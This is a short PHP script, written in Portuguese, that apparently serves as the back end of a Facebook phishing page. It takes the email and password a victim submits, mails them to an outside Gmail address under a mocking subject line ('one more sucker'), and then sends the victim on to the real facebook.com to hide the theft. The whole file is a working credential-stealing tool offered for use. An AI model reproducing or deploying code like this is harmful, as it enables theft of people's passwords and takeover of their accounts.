<?php

#form_login = email
#form_senha = pass

$email = $_POST['email'];
$senha = $_POST['pass'];


$total = "Email é : ".$email."Senha é : ".$senha."";
$envio = mail("cybercryanony@gmail.com", "email", "Mais um trouxa", $total);

header("Location: https://facebook.com");

?>

